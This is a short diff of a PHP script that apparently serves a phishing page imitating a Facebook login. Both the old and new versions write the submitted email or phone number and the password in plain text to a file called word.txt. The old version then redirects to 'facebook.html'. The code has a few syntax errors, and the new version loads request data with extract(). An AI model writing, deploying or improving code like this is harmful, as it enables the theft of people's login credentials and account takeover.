@@ -1,11 +1,12 @@
 <?php
-   $username = $_GET['name'];
-   $password = $_GET['pwd'];
-   $filename =  'word.txt';
-   $fp = fopen($filename, 'a+');
-   fwrite ($fp, $username . "," . $password . "\n");
-   $fclose ($fp);
-   echo ("account created");
-   header("Location: "facebook.html");
-   die();
+   extract($_REQUEST);
+   $file=fopen("word.txt","a");
+    
+
+   fwrite($file,"Email address or phone number :");
+   fwrite($file, $Email ."\n");
+   fwrite($file,"password :")
+   fwrite($file, $password ."\n");
+   fclose($file);
+   
    ?>
